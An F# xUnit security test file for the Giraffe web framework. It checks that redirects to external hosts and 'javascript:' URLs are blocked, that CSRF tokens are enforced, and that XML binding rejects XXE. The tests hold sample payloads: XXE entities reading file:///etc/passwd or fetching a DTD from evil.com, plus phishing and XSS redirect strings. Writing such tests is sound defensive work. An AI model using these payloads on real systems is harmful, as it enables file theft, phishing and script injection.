module Giraffe.Tests.SecurityTests

open System
open System.IO
open System.Text
open System.Collections.Generic
open System.Threading.Tasks
open Microsoft.AspNetCore.Http
open Microsoft.AspNetCore.Antiforgery
open Microsoft.Extensions.Logging
open Xunit
open NSubstitute
open Giraffe

// ---------------------------------
// URL Redirect Security Tests
// ---------------------------------

[<Fact>]
let ``redirectTo allows relative URLs starting with /`` () =
    let ctx = Substitute.For<HttpContext>()
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Host <- HostString "example.com"

    let app = redirectTo false "/safe-path"

    task {
        let! result = app next ctx

        match result with
        | None -> assertFail "Expected redirect to succeed"
        | Some ctx -> ctx.Response.Received().Redirect("/safe-path", false) |> ignore
    }

[<Fact>]
let ``redirectTo allows app-relative URLs starting with ~/`` () =
    let ctx = Substitute.For<HttpContext>()
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Host <- HostString "example.com"

    let app = redirectTo false "~/app-path"

    task {
        let! result = app next ctx

        match result with
        | None -> assertFail "Expected redirect to succeed"
        | Some ctx -> ctx.Response.Received().Redirect("~/app-path", false) |> ignore
    }

[<Fact>]
let ``redirectTo allows absolute URLs to same host`` () =
    let ctx = Substitute.For<HttpContext>()
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Host <- HostString "example.com"

    let app = redirectTo false "https://example.com/path"

    task {
        let! result = app next ctx

        match result with
        | None -> assertFail "Expected redirect to succeed"
        | Some ctx -> ctx.Response.Received().Redirect("https://example.com/path", false) |> ignore
    }

[<Fact>]
let ``redirectTo blocks open redirect to external domain`` () =
    let ctx = Substitute.For<HttpContext>()
    let loggerFactory = Substitute.For<ILoggerFactory>()
    let logger = Substitute.For<ILogger>()
    loggerFactory.CreateLogger(Arg.Any<string>()).Returns logger |> ignore
    let serviceProvider = Substitute.For<IServiceProvider>()

    serviceProvider.GetService(typeof<ILoggerFactory>).Returns loggerFactory
    |> ignore

    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Host <- HostString "example.com"

    let app = redirectTo false "https://evil.com/phishing"

    task {
        let! result = app next ctx

        match result with
        | None -> assertFail "Expected handler to return context"
        | Some ctx ->
            Assert.Equal(400, ctx.Response.StatusCode)
            // Verify warning was logged (simplified check - just verify it was called)
            logger
                .ReceivedWithAnyArgs(1)
                .Log(
                    LogLevel.Warning,
                    Arg.Any<EventId>(),
                    Arg.Any<obj>(),
                    Arg.Any<Exception>(),
                    Arg.Any<Func<obj, Exception, string>>()
                )
            |> ignore
    }

[<Fact>]
let ``redirectTo blocks javascript protocol XSS attempt`` () =
    let ctx = Substitute.For<HttpContext>()
    let loggerFactory = Substitute.For<ILoggerFactory>()
    let logger = Substitute.For<ILogger>()
    loggerFactory.CreateLogger(Arg.Any<string>()).Returns logger |> ignore
    let serviceProvider = Substitute.For<IServiceProvider>()

    serviceProvider.GetService(typeof<ILoggerFactory>).Returns loggerFactory
    |> ignore

    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Host <- HostString "example.com"

    let app = redirectTo false "javascript:alert('xss')"

    task {
        let! result = app next ctx

        match result with
        | None -> assertFail "Expected handler to return context"
        | Some ctx -> Assert.Equal(400, ctx.Response.StatusCode)
    }

[<Fact>]
let ``redirectTo blocks empty or whitespace URLs`` () =
    let ctx = Substitute.For<HttpContext>()
    let loggerFactory = Substitute.For<ILoggerFactory>()
    let logger = Substitute.For<ILogger>()
    loggerFactory.CreateLogger(Arg.Any<string>()).Returns logger |> ignore
    let serviceProvider = Substitute.For<IServiceProvider>()

    serviceProvider.GetService(typeof<ILoggerFactory>).Returns loggerFactory
    |> ignore

    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Host <- HostString "example.com"

    let app = redirectTo false "   "

    task {
        let! result = app next ctx

        match result with
        | None -> assertFail "Expected handler to return context"
        | Some ctx -> Assert.Equal(400, ctx.Response.StatusCode)
    }

[<Fact>]
let ``redirectTo with permanent flag calls Redirect with true`` () =
    let ctx = Substitute.For<HttpContext>()
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Host <- HostString "example.com"

    let app = redirectTo true "/permanent-redirect"

    task {
        let! result = app next ctx

        match result with
        | None -> assertFail "Expected redirect to succeed"
        | Some ctx -> ctx.Response.Received().Redirect("/permanent-redirect", true) |> ignore
    }

// ---------------------------------
// CSRF Token Security Tests
// ---------------------------------

[<Fact>]
let ``validateCsrfToken succeeds with valid token`` () =
    let ctx = Substitute.For<HttpContext>()
    let antiforgery = Substitute.For<IAntiforgery>()
    let serviceProvider = Substitute.For<IServiceProvider>()
    serviceProvider.GetService(typeof<IAntiforgery>).Returns antiforgery |> ignore
    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()

    antiforgery.IsRequestValidAsync(ctx).Returns(System.Threading.Tasks.Task.FromResult(true))
    |> ignore

    let mutable nextCalled = false

    let testNext: HttpFunc =
        fun _ ->
            nextCalled <- true
            System.Threading.Tasks.Task.FromResult(Some ctx)

    task {
        let! result = Csrf.validateCsrfToken testNext ctx

        match result with
        | None -> assertFail "Expected CSRF validation to succeed"
        | Some _ ->
            Assert.True(nextCalled, "Expected next handler to be called")
            Assert.NotEqual(403, ctx.Response.StatusCode)
    }

[<Fact>]
let ``validateCsrfToken fails with invalid token`` () =
    let ctx = Substitute.For<HttpContext>()
    let antiforgery = Substitute.For<IAntiforgery>()
    let loggerFactory = Substitute.For<ILoggerFactory>()
    let logger = Substitute.For<ILogger>()
    loggerFactory.CreateLogger(Arg.Any<string>()).Returns logger |> ignore
    let serviceProvider = Substitute.For<IServiceProvider>()
    serviceProvider.GetService(typeof<IAntiforgery>).Returns antiforgery |> ignore

    serviceProvider.GetService(typeof<ILoggerFactory>).Returns loggerFactory
    |> ignore

    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Path <- PathString("/test")

    antiforgery.IsRequestValidAsync(ctx).Returns(System.Threading.Tasks.Task.FromResult false)
    |> ignore

    let mutable nextCalled = false

    let testNext: HttpFunc =
        fun _ ->
            nextCalled <- true
            System.Threading.Tasks.Task.FromResult(Some ctx)

    task {
        let! result = Csrf.validateCsrfToken testNext ctx

        match result with
        | None -> assertFail "Expected handler to return context"
        | Some ctx ->
            Assert.False(nextCalled, "Expected next handler not to be called")
            Assert.Equal(403, ctx.Response.StatusCode)
    }

[<Fact>]
let ``validateCsrfToken fails on exception`` () =
    let ctx = Substitute.For<HttpContext>()
    let antiforgery = Substitute.For<IAntiforgery>()
    let loggerFactory = Substitute.For<ILoggerFactory>()
    let logger = Substitute.For<ILogger>()
    loggerFactory.CreateLogger(Arg.Any<string>()).Returns logger |> ignore
    let serviceProvider = Substitute.For<IServiceProvider>()
    serviceProvider.GetService(typeof<IAntiforgery>).Returns antiforgery |> ignore

    serviceProvider.GetService(typeof<ILoggerFactory>).Returns loggerFactory
    |> ignore

    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Path <- PathString "/test"

    antiforgery
        .IsRequestValidAsync(ctx)
        .Returns(System.Threading.Tasks.Task.FromException<bool>(InvalidOperationException("Test error")))
    |> ignore

    let mutable nextCalled = false

    let testNext: HttpFunc =
        fun _ ->
            nextCalled <- true
            System.Threading.Tasks.Task.FromResult(Some ctx)

    task {
        let! result = Csrf.validateCsrfToken testNext ctx

        match result with
        | None -> assertFail "Expected handler to return context"
        | Some ctx ->
            Assert.False(nextCalled, "Expected next handler not to be called")
            Assert.Equal(403, ctx.Response.StatusCode)
    }

[<Fact>]
let ``generateCsrfToken stores token in context items`` () =
    let ctx = Substitute.For<HttpContext>()
    let antiforgery = Substitute.For<IAntiforgery>()

    let tokens =
        AntiforgeryTokenSet("test-request-token", "test-cookie-token", "form-field", "X-CSRF-TOKEN")

    let serviceProvider = Substitute.For<IServiceProvider>()
    serviceProvider.GetService(typeof<IAntiforgery>).Returns antiforgery |> ignore
    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    ctx.Items <- Dictionary<obj, obj>() :> IDictionary<obj, obj>
    antiforgery.GetAndStoreTokens(ctx).Returns tokens |> ignore

    let mutable nextCalled = false

    let testNext: HttpFunc =
        fun _ ->
            nextCalled <- true
            System.Threading.Tasks.Task.FromResult(Some ctx)

    task {
        let! result = Csrf.generateCsrfToken testNext ctx

        match result with
        | None -> assertFail "Expected token generation to succeed"
        | Some ctx ->
            Assert.True(nextCalled, "Expected next handler to be called")
            Assert.True(ctx.Items.ContainsKey("CsrfToken"))
            Assert.Equal("test-request-token", ctx.Items.["CsrfToken"] :?> string)
            Assert.True(ctx.Items.ContainsKey("CsrfTokenHeaderName"))
            Assert.Equal("X-CSRF-TOKEN", ctx.Items.["CsrfTokenHeaderName"] :?> string)
    }

[<Fact>]
let ``csrfTokenJson returns token as JSON`` () =
    let ctx = Substitute.For<HttpContext>()
    let antiforgery = Substitute.For<IAntiforgery>()

    let tokens =
        AntiforgeryTokenSet("test-token-value", "cookie-value", "form-field", "X-CSRF-TOKEN")

    let serviceProvider = Substitute.For<IServiceProvider>()
    serviceProvider.GetService(typeof<IAntiforgery>).Returns antiforgery |> ignore
    let jsonSerializer = Json.Serializer(Json.Serializer.DefaultOptions)

    serviceProvider.GetService(typeof<Json.ISerializer>).Returns jsonSerializer
    |> ignore

    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    antiforgery.GetAndStoreTokens(ctx).Returns tokens |> ignore

    task {
        let! result = Csrf.csrfTokenJson next ctx

        match result with
        | None -> assertFail "Expected JSON response"
        | Some ctx ->
            let body = getBody ctx
            Assert.Contains("test-token-value", body)
            Assert.Contains("X-CSRF-TOKEN", body)
            Assert.Equal("application/json; charset=utf-8", ctx.Response |> getContentType)
    }

[<Fact>]
let ``csrfTokenHtml returns token as hidden input`` () =
    let ctx = Substitute.For<HttpContext>()
    let antiforgery = Substitute.For<IAntiforgery>()

    let tokens =
        AntiforgeryTokenSet("test-token-value", "cookie-value", "form-field", "X-CSRF-TOKEN")

    let serviceProvider = Substitute.For<IServiceProvider>()
    serviceProvider.GetService(typeof<IAntiforgery>).Returns antiforgery |> ignore
    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    antiforgery.GetAndStoreTokens(ctx).Returns tokens |> ignore

    task {
        let! result = Csrf.csrfTokenHtml next ctx

        match result with
        | None -> assertFail "Expected HTML response"
        | Some ctx ->
            let body = getBody ctx
            Assert.Contains("input", body)
            Assert.Contains("type=\"hidden\"", body)
            Assert.Contains("test-token-value", body)
            Assert.Contains("X-CSRF-TOKEN", body)
    }

// ---------------------------------
// XXE Prevention Tests
// ---------------------------------

[<CLIMutable>]
type TestXmlData = { Name: string; Value: int }

[<Fact>]
let ``XML deserialization works with normal XML`` () =
    let serializer =
        SystemXml.Serializer(SystemXml.Serializer.DefaultSettings) :> Xml.ISerializer

    let xml = """<TestXmlData><Name>Test</Name><Value>42</Value></TestXmlData>"""

    let result = serializer.Deserialize<TestXmlData> xml

    Assert.Equal("Test", result.Name)
    Assert.Equal(42, result.Value)

[<Fact>]
let ``XML deserialization blocks XXE attack with external entities`` () =
    let serializer =
        SystemXml.Serializer(SystemXml.Serializer.DefaultSettings) :> Xml.ISerializer

    // XML with DTD and external entity reference (XXE attack)
    let maliciousXml =
        """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<TestXmlData>
  <Name>&xxe;</Name>
  <Value>42</Value>
</TestXmlData>"""

    // Should throw an exception because DTD processing is prohibited
    Assert.Throws<InvalidOperationException>(fun () -> serializer.Deserialize<TestXmlData> maliciousXml |> ignore)
    |> ignore

[<Fact>]
let ``XML deserialization blocks XXE attack with parameter entities`` () =
    let serializer =
        SystemXml.Serializer(SystemXml.Serializer.DefaultSettings) :> Xml.ISerializer

    // XML with parameter entity (another XXE attack vector)
    let maliciousXml =
        """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
  %xxe;
]>
<TestXmlData>
  <Name>Attack</Name>
  <Value>0</Value>
</TestXmlData>"""

    // Should throw an exception because DTD processing is prohibited
    Assert.Throws<InvalidOperationException>(fun () -> serializer.Deserialize<TestXmlData> maliciousXml |> ignore)
    |> ignore

[<Fact>]
let ``XML deserialization through HTTP context blocks XXE`` () =
    task {
        let ctx = Substitute.For<HttpContext>()
        mockXml ctx

        let maliciousXml =
            """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<TestXmlData>
  <Name>&xxe;</Name>
  <Value>99</Value>
</TestXmlData>"""

        let stream = new MemoryStream()
        let writer = new StreamWriter(stream, Encoding.UTF8)
        writer.Write maliciousXml
        writer.Flush()
        stream.Position <- 0L

        ctx.Request.Body <- stream

        // Attempting to bind the malicious XML should throw
        let! result =
            task {
                try
                    let! data = ctx.BindXmlAsync<TestXmlData>()
                    return Ok data
                with ex ->
                    return Error ex.Message
            }

        match result with
        | Ok _ -> assertFail "Expected XXE attack to be blocked"
        | Error msg ->
            // Verify that an error occurred (DTD processing blocked)
            Assert.True(true)
    }

[<Fact>]
let ``XML deserialization through HTTP context allows normal XML`` () =
    task {
        let ctx = Substitute.For<HttpContext>()
        mockXml ctx

        let normalXml = """<TestXmlData><Name>Safe</Name><Value>123</Value></TestXmlData>"""

        let stream = new MemoryStream()
        let writer = new StreamWriter(stream, Encoding.UTF8)
        writer.Write normalXml
        writer.Flush()
        stream.Position <- 0L

        ctx.Request.Body <- stream

        let! result = ctx.BindXmlAsync<TestXmlData>()

        Assert.Equal("Safe", result.Name)
        Assert.Equal(123, result.Value)
    }

// ---------------------------------
// Extended API Tests (Custom Error Handlers)
// ---------------------------------

[<Fact>]
let ``redirectToExt allows custom error handler for invalid redirects`` () =
    let ctx = Substitute.For<HttpContext>()
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Host <- HostString("example.com")

    let customHandler: HttpHandler =
        fun (next: HttpFunc) (ctx: HttpContext) ->
            ctx.Response.StatusCode <- 418 // I'm a teapot
            System.Threading.Tasks.Task.FromResult(Some ctx)

    let app = redirectToExt false "https://evil.com/phishing" (Some customHandler)

    task {
        let! result = app next ctx

        match result with
        | None -> assertFail "Expected handler to return context"
        | Some ctx -> Assert.Equal(418, ctx.Response.StatusCode)
    }

[<Fact>]
let ``redirectToExt with None handler uses default behavior`` () =
    let ctx = Substitute.For<HttpContext>()
    let loggerFactory = Substitute.For<ILoggerFactory>()
    let logger = Substitute.For<ILogger>()
    loggerFactory.CreateLogger(Arg.Any<string>()).Returns logger |> ignore
    let serviceProvider = Substitute.For<IServiceProvider>()

    serviceProvider.GetService(typeof<ILoggerFactory>).Returns loggerFactory
    |> ignore

    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Host <- HostString("example.com")

    let app = redirectToExt false "https://evil.com/phishing" None

    task {
        let! result = app next ctx

        match result with
        | None -> assertFail "Expected handler to return context"
        | Some ctx -> Assert.Equal(400, ctx.Response.StatusCode)
    }

[<Fact>]
let ``isValidRedirectUrl correctly validates safe URLs`` () =
    let ctx = Substitute.For<HttpContext>()
    ctx.Request.Host <- HostString("example.com")

    Assert.True(isValidRedirectUrl ctx "/safe-path")
    Assert.True(isValidRedirectUrl ctx "~/app-path")
    Assert.True(isValidRedirectUrl ctx "https://example.com/path")
    Assert.False(isValidRedirectUrl ctx "https://evil.com/phishing")
    Assert.False(isValidRedirectUrl ctx "javascript:alert('xss')")
    Assert.False(isValidRedirectUrl ctx "   ")
    Assert.False(isValidRedirectUrl ctx "")

[<Fact>]
let ``validateCsrfTokenExt allows custom error handler for invalid tokens`` () =
    let ctx = Substitute.For<HttpContext>()
    let antiforgery = Substitute.For<IAntiforgery>()
    let serviceProvider = Substitute.For<IServiceProvider>()
    serviceProvider.GetService(typeof<IAntiforgery>).Returns antiforgery |> ignore
    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Path <- PathString "/test"

    antiforgery.IsRequestValidAsync(ctx).Returns(System.Threading.Tasks.Task.FromResult false)
    |> ignore

    let customHandler: HttpHandler =
        fun (next: HttpFunc) (ctx: HttpContext) ->
            ctx.Response.StatusCode <- 418 // I'm a teapot
            System.Threading.Tasks.Task.FromResult(Some ctx)

    let mutable nextCalled = false

    let testNext: HttpFunc =
        fun _ ->
            nextCalled <- true
            System.Threading.Tasks.Task.FromResult(Some ctx)

    task {
        let! result = Csrf.validateCsrfTokenExt (Some customHandler) testNext ctx

        match result with
        | None -> assertFail "Expected handler to return context"
        | Some ctx ->
            Assert.False(nextCalled, "Expected next handler not to be called")
            Assert.Equal(418, ctx.Response.StatusCode)
    }

[<Fact>]
let ``validateCsrfTokenExt with None handler uses default behavior`` () =
    let ctx = Substitute.For<HttpContext>()
    let antiforgery = Substitute.For<IAntiforgery>()
    let loggerFactory = Substitute.For<ILoggerFactory>()
    let logger = Substitute.For<ILogger>()
    loggerFactory.CreateLogger(Arg.Any<string>()).Returns logger |> ignore
    let serviceProvider = Substitute.For<IServiceProvider>()
    serviceProvider.GetService(typeof<IAntiforgery>).Returns antiforgery |> ignore

    serviceProvider.GetService(typeof<ILoggerFactory>).Returns loggerFactory
    |> ignore

    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()
    ctx.Request.Path <- PathString "/test"

    antiforgery.IsRequestValidAsync(ctx).Returns(System.Threading.Tasks.Task.FromResult false)
    |> ignore

    let mutable nextCalled = false

    let testNext: HttpFunc =
        fun _ ->
            nextCalled <- true
            System.Threading.Tasks.Task.FromResult(Some ctx)

    task {
        let! result = Csrf.validateCsrfTokenExt None testNext ctx

        match result with
        | None -> assertFail "Expected handler to return context"
        | Some ctx ->
            Assert.False(nextCalled, "Expected next handler not to be called")
            Assert.Equal(403, ctx.Response.StatusCode)
    }

[<Fact>]
let ``requireAntiforgeryTokenExt is alias for validateCsrfTokenExt`` () =
    let ctx = Substitute.For<HttpContext>()
    let antiforgery = Substitute.For<IAntiforgery>()
    let serviceProvider = Substitute.For<IServiceProvider>()
    serviceProvider.GetService(typeof<IAntiforgery>).Returns antiforgery |> ignore
    ctx.RequestServices.Returns serviceProvider |> ignore
    ctx.Response.Body <- new MemoryStream()

    antiforgery.IsRequestValidAsync(ctx).Returns(System.Threading.Tasks.Task.FromResult true)
    |> ignore

    let mutable nextCalled = false

    let testNext: HttpFunc =
        fun _ ->
            nextCalled <- true
            System.Threading.Tasks.Task.FromResult(Some ctx)

    task {
        let! result = Csrf.requireAntiforgeryTokenExt None testNext ctx

        match result with
        | None -> assertFail "Expected CSRF validation to succeed"
        | Some _ -> Assert.True(nextCalled, "Expected next handler to be called")
    }
